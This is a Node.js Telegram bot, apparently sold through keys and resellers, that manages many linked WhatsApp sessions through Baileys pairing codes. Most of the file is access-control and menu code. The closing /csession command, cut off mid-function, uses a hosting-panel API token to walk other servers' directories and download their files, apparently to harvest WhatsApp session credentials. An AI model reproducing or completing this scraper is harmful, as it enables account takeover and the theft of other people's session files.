const { Telegraf, Markup } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const config = require("./database/config.js");
const axios = require("axios");
const express = require('express');
const fetch = require("node-fetch");
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
//const { InlineKeyboard } = require("grammy");
const { spawn } = require('child_process');
const {
default: makeWASocket,
makeCacheableSignalKeyStore,
useMultiFileAuthState,
DisconnectReason,
fetchLatestBaileysVersion,
fetchLatestWaWebVersion,
generateForwardMessageContent,
prepareWAMessageMedia,
generateWAMessageFromContent,
generateMessageTag,
generateMessageID,
downloadContentFromMessage,
makeInMemoryStore,
getContentType,
jidDecode,
MessageRetryMap,
getAggregateVotesInPollMessage,
proto,
delay
} = require("@whiskeysockets/baileys");

const { tokens, owners: ownerIds, ipvps: VPS, port: PORT } = config;
const bot = new Telegraf(tokens);
const cors = require("cors");
const app = express();

app.use(cors());

const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const file = "./database/akses.json";
const userPath = path.join(__dirname, "./database/user.json");
const userSessionsPath = path.join(__dirname, "user_sessions.json");
const userEvents = new Map(); 
let userApiBug = null;
let sock;


function loadAkses() {
  if (!fs.existsSync(file)) {
    const initData = {
      owners: [],
      akses: [],
      resellers: [],
      pts: [],
      moderators: []
    };
    fs.writeFileSync(file, JSON.stringify(initData, null, 2));
    return initData;
  }

  let data = JSON.parse(fs.readFileSync(file));

  if (!data.resellers) data.resellers = [];
  if (!data.pts) data.pts = [];
  if (!data.moderators) data.moderators = [];

  return data;
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}


function isOwner(id) {
  const data = loadAkses();
  return data.owners.includes(id.toString());
}

function isAuthorized(id) {
  const data = loadAkses();
  return (
    isOwner(id) ||
    data.akses.includes(id.toString()) ||
    data.resellers.includes(id.toString()) ||
    data.pts.includes(id.toString()) ||
    data.moderators.includes(id.toString())
  );
}

function isReseller(id) {
  const data = loadAkses();
  return data.resellers.includes(id.toString());
}

function isPT(id) {
  const data = loadAkses();
  return data.pts.includes(id.toString());
}

function isModerator(id) {
  const data = loadAkses();
  return data.moderators.includes(id.toString());
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

function saveUsers(users) {
  const filePath = path.join(__dirname, "database", "user.json");
  try {
    fs.writeFileSync(filePath, JSON.stringify(users, null, 2), "utf-8");
    console.log("✓ Data user berhasil disimpan.");
  } catch (err) {
    console.error("✗ Gagal menyimpan user:", err);
  }
}

function getUsers() {
  const filePath = path.join(__dirname, "database", "user.json");
  if (!fs.existsSync(filePath)) return [];
  try {
    return JSON.parse(fs.readFileSync(filePath, "utf-8"));
  } catch (err) {
    console.error("✗ Gagal membaca file user.json:", err);
    return [];
  }
}

function loadUserSessions() {
  if (!fs.existsSync(userSessionsPath)) {
    console.log(`[SESSION] 📂 Creating new user_sessions.json`);
    const initialData = {};
    fs.writeFileSync(userSessionsPath, JSON.stringify(initialData, null, 2));
    return initialData;
  }
  
  try {
    const data = JSON.parse(fs.readFileSync(userSessionsPath, "utf8"));
    const sessionCount = Object.values(data).reduce((acc, numbers) => acc + numbers.length, 0);
    console.log(`[SESSION] 📂 Loaded ${sessionCount} sessions from ${Object.keys(data).length} users`);
    return data;
  } catch (err) {
    console.error("[SESSION] ❌ Error loading user_sessions.json, resetting:", err);
    
    const initialData = {};
    fs.writeFileSync(userSessionsPath, JSON.stringify(initialData, null, 2));
    return initialData;
  }
}

const userSessionPath = (username, BotNumber) => {
  const userDir = path.join(sessions_dir, "users", username);
  const dir = path.join(userDir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

function saveUserSessions(data) {
  try {
    fs.writeFileSync(userSessionsPath, JSON.stringify(data, null, 2));
    const sessionCount = Object.values(data).reduce((acc, numbers) => acc + numbers.length, 0);
    console.log(`[SESSION] 💾 Saved ${sessionCount} sessions for ${Object.keys(data).length} users`);
  } catch (err) {
    console.error("❌ Gagal menyimpan user_sessions.json:", err);
  }
}

function sendEventToUser(username, eventData) {
  if (userEvents.has(username)) {
    const res = userEvents.get(username);
    try {
      res.write(`data: ${JSON.stringify(eventData)}\n\n`);
    } catch (err) {
      console.error(`[Events] Error sending to ${username}:`, err.message);
      userEvents.delete(username);
    }
  }
}

bot.command("addreseller", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isPT(userId) && !isModerator(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /addreseller <id>");

  const data = loadAkses();
  if (data.resellers.includes(id)) return ctx.reply("✗ Already a reseller.");

  data.resellers.push(id);
  saveAkses(data);
  ctx.reply(`✓ Reseller added: ${id}`);
});

bot.command("delreseller", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /delreseller <id>");

  const data = loadAkses();
  data.resellers = data.resellers.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Reseller removed: ${id}`);
});

bot.command("addpt", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isModerator(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /addpt <id>");

  const data = loadAkses();
  if (data.pts.includes(id)) return ctx.reply("✗ Already PT.");

  data.pts.push(id);
  saveAkses(data);
  ctx.reply(`✓ PT added: ${id}`);
});

bot.command("delpt", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /delpt <id>");

  const data = loadAkses();
  data.pts = data.pts.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ PT removed: ${id}`);
});

bot.command("addmod", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /addmod <id>");

  const data = loadAkses();
  if (data.moderators.includes(id)) return ctx.reply("✗ Already Moderator.");

  data.moderators.push(id);
  saveAkses(data);
  ctx.reply(`✓ Moderator added: ${id}`);
});

bot.command("delmod", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];

  if (!isOwner(userId)) {
    return ctx.reply("🚫 Akses ditolak.");
  }
  if (!id) return ctx.reply("Usage: /delmod <id>");

  const data = loadAkses();
  data.moderators = data.moderators.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Moderator removed: ${id}`);
});

// ==================== AUTO RELOAD SESSIONS ON STARTUP ==================== //
let reloadAttempts = 0;
const MAX_RELOAD_ATTEMPTS = 3;

function forceReloadWithRetry() {
  reloadAttempts++;
  console.log(`\n🔄 RELOAD ATTEMPT ${reloadAttempts}/${MAX_RELOAD_ATTEMPTS}`);
  
  const userSessions = loadUserSessions();
  
  if (Object.keys(userSessions).length === 0) {
    console.log('💡 No sessions to reload - waiting for users to add senders');
    return;
  }
  
  console.log(`📋 Found ${Object.keys(userSessions).length} users with sessions`);
  simpleReloadSessions();
  
  setTimeout(() => {
    const activeSessionCount = sessions.size;
    console.log(`📊 Current active sessions: ${activeSessionCount}`);
    
    if (activeSessionCount === 0 && reloadAttempts < MAX_RELOAD_ATTEMPTS) {
      console.log(`🔄 No active sessions, retrying... (${reloadAttempts}/${MAX_RELOAD_ATTEMPTS})`);
      forceReloadWithRetry();
    } else if (activeSessionCount === 0) {
      console.log('❌ All reload attempts failed - manual reconnection required');
    } else {
      console.log(`✅ SUCCESS: ${activeSessionCount} sessions active`);
    }
  }, 30000);
}

function simpleReloadSessions() {
  console.log('=== 🔄 SESSION RELOAD STARTED ===');
  const userSessions = loadUserSessions();
  
  if (Object.keys(userSessions).length === 0) {
    console.log('💡 No user sessions found - waiting for users to add senders');
    return;
  }

  let totalProcessed = 0;
  let successCount = 0;

  for (const [username, numbers] of Object.entries(userSessions)) {
    console.log(`👤 Processing user: ${username} with ${numbers.length} senders`);
    
    numbers.forEach(number => {
      totalProcessed++;
      const sessionDir = userSessionPath(username, number);
      const credsPath = path.join(sessionDir, 'creds.json');
      
      if (fs.existsSync(credsPath)) {
        console.log(`🔄 Attempting to reconnect: ${number} for ${username}`);
        
        connectToWhatsAppUser(username, number, sessionDir)
          .then(sock => {
            successCount++;
            console.log(`✅ Successfully reconnected: ${number}`);
          })
          .catch(err => {
            console.log(`❌ Failed to reconnect ${number}: ${err.message}`);
          });
      } else {
        console.log(`⚠️ No session files found for ${number}, skipping`);
      }
    });
  }
  
  console.log(`📊 Reload summary: ${successCount}/${totalProcessed} sessions reconnected`);
}

const connectToWhatsAppUser = async (username, BotNumber, sessionDir) => {
  try {
    console.log(`[${username}] 🚀 Starting WhatsApp connection for ${BotNumber}`);
    
    sendEventToUser(username, {
      type: 'status',
      message: 'Memulai koneksi WhatsApp...',
      number: BotNumber,
      status: 'connecting'
    });

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestWaWebVersion();

    const userSock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: 60000,
      connectTimeoutMs: 60000,
      keepAliveIntervalMs: 10000,
      generateHighQualityLinkPreview: true,
      syncFullHistory: false
    });

    return new Promise((resolve, reject) => {
      let isConnected = false;
      let pairingCodeGenerated = false;
      let connectionTimeout;

      const cleanup = () => {
        if (connectionTimeout) clearTimeout(connectionTimeout);
      };

      userSock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        console.log(`[${username}] 🔄 Connection update:`, connection);

        if (connection === "close") {
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          console.log(`[${username}] ❌ Connection closed with status:`, statusCode);

          sessions.delete(BotNumber);
          console.log(`[${username}] 🗑️ Removed ${BotNumber} from sessions map`);

          if (statusCode === DisconnectReason.loggedOut) {
            console.log(`[${username}] 📵 Device logged out, cleaning session...`);
            sendEventToUser(username, {
              type: 'error',
              message: 'Device logged out, silakan scan ulang',
              number: BotNumber,
              status: 'logged_out'
            });
            
            if (fs.existsSync(sessionDir)) {
              fs.rmSync(sessionDir, { recursive: true, force: true });
            }
            cleanup();
            reject(new Error("Device logged out, please pairing again"));
            return;
          }

          if (statusCode === DisconnectReason.restartRequired || 
              statusCode === DisconnectReason.timedOut) {
            console.log(`[${username}] 🔄 Reconnecting...`);
            sendEventToUser(username, {
              type: 'status',
              message: 'Mencoba menyambung kembali...',
              number: BotNumber,
              status: 'reconnecting'
            });
            
            setTimeout(async () => {
              try {
                const newSock = await connectToWhatsAppUser(username, BotNumber, sessionDir);
                resolve(newSock);
              } catch (error) {
                reject(error);
              }
            }, 5000);
            return;
          }

          if (!isConnected) {
            cleanup();
            sendEventToUser(username, {
              type: 'error',
              message: `Koneksi gagal dengan status: ${statusCode}`,
              number: BotNumber,
              status: 'failed'
            });
            reject(new Error(`Connection failed with status: ${statusCode}`));
          }
        }

        if (connection === "open") {
          console.log(`[${username}] ✅ CONNECTED SUCCESSFULLY!`);
          isConnected = true;
          cleanup();
          
          sessions.set(BotNumber, userSock);
          
          sendEventToUser(username, {
            type: 'success',
            message: 'Berhasil terhubung dengan WhatsApp!',
            number: BotNumber,
            status: 'connected'
          });
          
          const userSessions = loadUserSessions();
  if (!userSessions[username]) {
    userSessions[username] = [];
  }
  if (!userSessions[username].includes(BotNumber)) {
    userSessions[username].push(BotNumber);
    saveUserSessions(userSessions);
    console.log(`[${username}] 💾 Session saved for ${BotNumber}`);
  }
          
          resolve(userSock);
        }

        if (connection === "connecting") {
          console.log(`[${username}] 🔄 Connecting to WhatsApp...`);
          sendEventToUser(username, {
            type: 'status',
            message: 'Menghubungkan ke WhatsApp...',
            number: BotNumber,
            status: 'connecting'
          });
          
          if (!fs.existsSync(`${sessionDir}/creds.json`) && !pairingCodeGenerated) {
            pairingCodeGenerated = true;
            
            setTimeout(async () => {
              try {
                console.log(`[${username}] 📞 Requesting pairing code for ${BotNumber}...`);
                sendEventToUser(username, {
                  type: 'status',
                  message: 'Meminta kode pairing...',
                  number: BotNumber,
                  status: 'requesting_code'
                });
                
                const code = await userSock.requestPairingCode(BotNumber);
                const formattedCode = code.match(/.{1,4}/g)?.join('-') || code;
                
                console.log(`╔═══════════════════════════════════╗`);
                console.log(`║  📱 PAIRING CODE - ${username}`);
                console.log(`╠═══════════════════════════════════╣`);
                console.log(`║  Nomor Sender : ${BotNumber}`);
                console.log(`║  Kode Pairing : ${formattedCode}`);
                console.log(`╚═══════════════════════════════════╝`);
                
                sendEventToUser(username, {
                  type: 'pairing_code',
                  message: 'Kode Pairing Berhasil Digenerate!',
                  number: BotNumber,
                  code: formattedCode,
                  status: 'waiting_pairing',
                  instructions: [
                    '1. Buka WhatsApp di HP Anda',
                    '2. Tap ⋮ (titik tiga) > Linked Devices > Link a Device',
                    '3. Masukkan kode pairing berikut:',
                    `KODE: ${formattedCode}`,
                    '4. Kode berlaku 30 detik!'
                  ]
                });
                
              } catch (err) {
                console.error(`[${username}] ❌ Error requesting pairing code:`, err.message);
                sendEventToUser(username, {
                  type: 'error',
                  message: `Gagal meminta kode pairing: ${err.message}`,
                  number: BotNumber,
                  status: 'code_error'
                });
              }
            }, 3000);
          }
        }

        if (qr) {
          console.log(`[${username}] 📋 QR Code received`);
          sendEventToUser(username, {
            type: 'qr',
            message: 'Scan QR Code berikut:',
            number: BotNumber,
            qr: qr,
            status: 'waiting_qr'
          });
        }
      });

      userSock.ev.on("creds.update", saveCreds);
      
      connectionTimeout = setTimeout(() => {
        if (!isConnected) {
          sendEventToUser(username, {
            type: 'error', 
            message: 'Timeout - Tidak bisa menyelesaikan koneksi dalam 120 detik',
            number: BotNumber,
            status: 'timeout'
          });
          cleanup();
          reject(new Error("Connection timeout - tidak bisa menyelesaikan koneksi"));
        }
      }, 120000);
    });
  } catch (error) {
    console.error(`[${username}] ❌ Error in connectToWhatsAppUser:`, error);
    sendEventToUser(username, {
      type: 'error',
      message: `Error: ${error.message}`,
      number: BotNumber,
      status: 'error'
    });
    throw error;
  }
};

bot.command("start", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || "Usuário";

  const teks = `
<blockquote>🍁 Database SHIZUKU Bot</blockquote>
<i>Now SHIZUKU has been updated</i>
<i>latest styles, lots of tools, and improved security system</i>

<blockquote>「 Information 」</blockquote>
<b>Developer : @kyu_storee1</b>
<b>Version   : 4 ⧸ <code>IV</code></b>
<b>Username  : ${username}</b>

<i>Silakan pilih menu di bawah untuk mengakses fitur bot:</i>
`;

  const keyboard = Markup.keyboard([
    ["🔑 Create Menu", "🔐 Access Menu"],
    ["ℹ️ Bot Info", "💬 Chat"],
    ["📢 Channel"]
  ])
  .resize()
  .oneTime(false);

  await ctx.reply(teks, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
});

bot.hears("🔑 Create Menu", async (ctx) => {
  const indictiveMenu = `
<blockquote>🍁 Database SHIZUKU Bot</blockquote>
<i>These are some settings menu</i>

<b>🔑 Create Menu</b>
• /addkey
• /listkey
• /delkey
`;

  await ctx.reply(indictiveMenu, {
    parse_mode: "HTML",
    reply_markup: Markup.inlineKeyboard([
      [ Markup.button.url("INFORMATION", "https://whatsapp.com/channel/0029VbD3Wxd8fewnbvPEq635t") ]
    ]).reply_markup
  });
});

bot.hears("🔐 Access Menu", async (ctx) => {
  const accessMenu = `
<blockquote>🍁 Database SHIZUKU Bot</blockquote>
<i>This is the menu to take user access</i>

<b>🔐 Access Menu</b>
• /addacces
• /delacces
• /addowner
• /delowner
• /addreseller
• /delreseller
• /addpt
• /delpt
• /addmod
• /delmod
`;

  await ctx.reply(accessMenu, {
    parse_mode: "HTML",
    reply_markup: Markup.inlineKeyboard([
      [ Markup.button.url("INFORMATION", "https://whatsapp.com/channel/0029Vb6tUpsD8SDq4haS0i0t") ]
    ]).reply_markup
  });
});

bot.hears("ℹ️ Bot Info", async (ctx) => {
  const infoText = `
<blockquote>🤖 Bot Information</blockquote>
<b>Database SHIZUKU Bot</b>
<i>Advanced multi-functional bot with enhanced security features and latest tools.</i>

<b>🔧 Features:</b>
• User Management
• Access Control
• Multi-tool Integration
• Secure Operations

<b>📞 Support:</b>
Contact @kyu_storee1 for assistance
`;

  await ctx.reply(infoText, {
    parse_mode: "HTML",
    reply_markup: Markup.inlineKeyboard([
      [ Markup.button.url("INFORMATION", "https://whatsapp.com/channel/0029Vb6tUpsD8SDq4haS0i0t") ]
    ]).reply_markup
  });
});

bot.hears("💬 Chat", (ctx) => {
  ctx.reply("💬 Chat dengan developer: https://t.me/kyu_storee1");
});

bot.hears("📢 Channel", (ctx) => {
  ctx.reply("📢 Channel updates: https://whatsapp.com/channel/0029Vb6tUpsD8SDq4haS0i0t");
});

bot.action("show_indictive_menu", async (ctx) => {
  const indictiveMenu = `
<blockquote>🍁 Database SHIZUKU Bot</blockquote>
<i>These are some settings menu</i>

<b>🔑 Create Menu</b>
• /addkey
• /listkey
• /delkey
`;

  const keyboard = Markup.inlineKeyboard([
    [ Markup.button.url("INFORMATION", "https://whatsapp.com/channel/0029Vb6tUpsD8SDq4haS0i0t") ]
  ]);

  await ctx.editMessageText(indictiveMenu, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

bot.action("show_access_menu", async (ctx) => {
  const accessMenu = `
<blockquote>🍁 Database SHIZUKU Bot</blockquote>
<i>This is the menu to take user access</i>

<b>🔑 Access Menu</b>
• /addacces
• /delacces
• /addowner
• /delowner
• /addreseller
• /delreseller
• /addpt
• /delpt
• /addmod
• /delmod
`;

  const keyboard = Markup.inlineKeyboard([
    [ Markup.button.url("INFORMATION", "https://whatsapp.com/channel/0029Vb6tUpsD8SDq4haS0i0t") ]
  ]);

  await ctx.editMessageText(accessMenu, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

bot.action("show_bot_info", async (ctx) => {
  const infoText = `
<blockquote>🤖 Bot Information</blockquote>
<b>Database SHIZUKU Bot</b>
<i>Advanced multi-functional bot with enhanced security features and latest tools.</i>

<b>🔧 Features:</b>
• User Management
• Access Control
• Multi-tool Integration
• Secure Operations

<b>📞 Support:</b>
Contact @kyu_storee1 for assistance
`;

  const keyboard = Markup.inlineKeyboard([
    [ Markup.button.url("INFORMATION", "https://whatsapp.com/channel/0029Vb6tUpsD8SDq4haS0i0t") ]
  ]);

  await ctx.editMessageText(infoText, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

bot.action("back_to_main", async (ctx) => {
  const username = ctx.from.username || ctx.from.first_name || "Usuário";
  
  const teks = `
<blockquote>🍁 Database SHIZUKU Bot</blockquote>
<i>Now SHIZUKU has been updated</i>
<i>latest styles, lots of tools, and improved security system</i>

<blockquote>「 Information 」</blockquote>
<b>Developer : @kyu_storee1</b>
<b>Version   : 1 ⧸ <code>IV</code></b>
<b>Username  : ${username}</b>

<i>Silakan pilih menu di bawah untuk mengakses fitur bot:</i>
`;

  const keyboard = Markup.keyboard([
    ["🔑 Create Menu", "🔐 Access Menu"],
    ["ℹ️ Bot Info", "💬 Chat"],
    ["📢 Channel"]
  ])
  .resize()
  .oneTime(false);

  await ctx.editMessageText(teks, {
    parse_mode: "HTML",
    reply_markup: keyboard.reply_markup,
  });
  await ctx.answerCbQuery();
});

bot.command("sessions", (ctx) => {
  const userSessions = loadUserSessions();
  const activeSessions = sessions.size;
  
  let message = `📊 **Session Status**\n\n`;
  message += `**Active Sessions:** ${activeSessions}\n`;
  message += `**Registered Users:** ${Object.keys(userSessions).length}\n\n`;
  
  Object.entries(userSessions).forEach(([username, numbers]) => {
    message += `**${username}:** ${numbers.length} sender(s)\n`;
    numbers.forEach(number => {
      const isActive = sessions.has(number);
      message += `  - ${number} ${isActive ? '✅' : '❌'}\n`;
    });
  });
  
  ctx.reply(message, { parse_mode: "Markdown" });
});

bot.command("addkey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ")[1];

  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ❗ ] - Akses hanya untuk Owner - tidak bisa sembarang orang bisa mengakses fitur ini.");
  }

  if (!args || !args.includes(",")) {
    return ctx.reply("✗ Akses hanya untuk Owner - tidak bisa sembarang orang bisa mengakses fitur ini\n\nExample :\n• /addkey SHIZUKU,1d\n• /addkey SHIZUKU,1d,aii", { parse_mode: "HTML" });
  }

  const parts = args.split(",");
  const username = parts[0].trim();
  const durasiStr = parts[1].trim();
  const customKey = parts[2] ? parts[2].trim() : null;

  const durationMs = parseDuration(durasiStr);
  if (!durationMs) return ctx.reply("✗ Format durasi salah! Gunakan contoh: 7d / 1d / 12h");

  const key = customKey || generateKey(4);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex] = { ...users[userIndex], key, expired };
  } else {
    users.push({ username, key, expired });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  await ctx.reply(
    `✓ <b>Key berhasil dibuat:</b>\n\n` +
    `<b>Username:</b> <code>${username}</code>\n` +
    `<b>Key:</b> <code>${key}</code>\n` +
    `<b>Expired:</b> <i>${expiredStr}</i> WIB`,
    { parse_mode: "HTML" }
  );
});

bot.command("listkey", async (ctx) => {
  const userId = ctx.from.id.toString();
  const users = getUsers();

  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }

  if (users.length === 0) return ctx.reply("💢 No keys have been created yet.");

  let teks = `𞅏 𝑨𝒄𝒕𝒊𝒗𝒆 𝑲𝒆𝒚 𝑳𝒊𝒔𝒕:\n\n`;

  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });
    teks += `${i + 1}. ${u.username}\nKey: ${u.key}\nExpired: ${exp} WIB\n\n`;
  });

  await ctx.reply(teks);
});

bot.command("delkey", (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("[ ❗ ] - Akses hanya untuk Owner - tidak bisa sembarang orang bisa mengakses fitur ini.");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey Kyu");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);
  if (index === -1) return ctx.reply(`✗ Username \`${username}\` not found.`, { parse_mode: "HTML" });

  users.splice(index, 1);
  saveUsers(users);
  ctx.reply(`✓ Key belonging to ${username} was successfully deleted.`, { parse_mode: "HTML" });
});

bot.command("addacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /addacces 8270020269", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✓ User already has access.");

  data.akses.push(id);
  saveAkses(data);
  ctx.reply(`✓ Access granted to ID: ${id}`);
});

bot.command("delacces", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /delacces 8270020269", { parse_mode: "HTML" });

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("✗ User not found.");

  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`✓ Access to user ID ${id} removed.`);
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /addowner 8270020269", { parse_mode: "HTML" });

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("✗ Already an owner.");

  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`✓ New owner added: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  const id = ctx.message.text.split(" ")[1];
  
  if (!isOwner(userId)) {
    return ctx.reply("[ ❗ ] - Cuma untuk pemilik - daftar dlu kalo mau akses fitur nya.");
  }
  if (!id) return ctx.reply("✗ Format salah\n\nExample : /delowner 8270020269", { parse_mode: "HTML" });

  const data = loadAkses();

  if (!data.owners.includes(id)) return ctx.reply("✗ Not the owner.");

  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);

  ctx.reply(`✓ Owner ID ${id} was successfully deleted.`);
});

bot.command("getcode", async (ctx) => {
    const chatId = ctx.chat.id;
    const input = ctx.message.text.split(" ").slice(1).join(" ").trim();

    if (!input) {
        return ctx.reply("❌ Missing input. Please provide a website URL.\n\nExample:\n/getcode https://example.com");
    }

    const url = input;

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/tools/getcode?url=${encodeURIComponent(url)}`;
        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result) {
            return ctx.reply("❌ Failed to fetch source code. Please check the URL.");
        }

        const code = data.result;

        if (code.length > 4000) {
            const filePath = `sourcecode_${Date.now()}.html`;
            fs.writeFileSync(filePath, code);

            await ctx.replyWithDocument({ source: filePath, filename: `sourcecode.html` }, { caption: `📄 Full source code from: ${url}` });

            fs.unlinkSync(filePath);
        } else {
            await ctx.replyWithHTML(`📄 Source Code from: ${url}\n\n<code>${code}</code>`);
        }
    } catch (err) {
        console.error("GetCode API Error:", err);
        ctx.reply("❌ Error fetching website source code. Please try again later.");
    }
});

bot.command("csession", async (ctx) => {
  const DEBUG_CS = false;
  const SEND_TO_CALLER = false;
  const REQUEST_DELAY_MS = 250;
  const MAX_DEPTH = 12;
  const MAX_SEND_TEXT = 3500;
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));

  function isDirectory(item) {
    if (!item) return false;
    const a = item.attributes || {};
    const checks = [
      a.type, a.mode, item.type, item.mode,
      a.is_directory, a.isDir, a.directory,
      item.is_directory, item.isDir, item.directory
    ];
    for (let c of checks) {
      if (typeof c === "string") {
        const lc = c.toLowerCase();
        if (lc === "dir" || lc === "directory" || lc === "d") return true;
        if (lc === "file" || lc === "f") return false;
      }
      if (c === true) return true;
      if (c === false) return false;
    }
    return false;
  }

  function normalizeDir(dir) {
    if (!dir) return "/";
    let d = String(dir).replace(/\/+/g, "/");
    if (!d.startsWith("/")) d = "/" + d;
    if (d.length > 1 && d.endsWith("/")) d = d.slice(0, -1);
    return d;
  }

  function extractNameAndMaybeFullPath(item) {
    const a = item.attributes || {};
    const candidates = [a.name, item.name, a.filename, item.filename, a.path, item.path];
    for (let c of candidates) {
      if (!c) continue;
      const s = String(c).trim();
      if (s) return s;
    }
    for (let k of Object.keys(item)) {
      if (/name|file|path|filename/i.test(k) && item[k]) return String(item[k]);
    }
    return "";
  }

  async function apiListFiles(domainBase, identifier, dir) {
    try {
      const res = await axios.get(`${domainBase}/api/client/servers/${identifier}/files/list`, {
        params: { directory: dir },
        headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` }
      });
      return res.data;
    } catch (e) {
      if (DEBUG_CS) console.error("apiListFiles error", e && (e.response && e.response.data) ? e.response.data : e.message);
      return null;
    }
  }

  async function tryDownloadFile(domainBase, identifier, absFilePath) {
    const candidates = [];
    const p = String(absFilePath || "").replace(/\/+/g, "/");
    if (!p) return null;
    candidates.push(p.startsWith("/") ? p : "/" + p);
    const noLead = p.startsWith("/") ? p.slice(1) : p;
    if (!candidates.includes("/" + noLead)) candidates.push("/" + noLead);
    candidates.push(noLead);

    for (let c of candidates) {
      try {
        const dlMeta = await axios.get(`${domainBase}/api/client/servers/${identifier}/files/download`, {
          params: { file: c },
          headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` }
        });
        if (dlMeta && dlMeta.data && dlMeta.data.attributes && dlMeta.data.attributes.url) {
          const url = dlMeta.data.attributes.url;
          const fileRes = await axios.get(url, { responseType: "arraybuffer" });
          return { buffer: Buffer.from(fileRes.data), meta: dlMeta.data };
        }
      } catch (e) {
        if (DEBUG_CS) console.error("tryDownloadFile attempt", c, e && (e.response && e.response.data) ? e.response.data : e.message);
      }
      await sleep(REQUEST_DELAY_MS);
    }
    return null;
  }

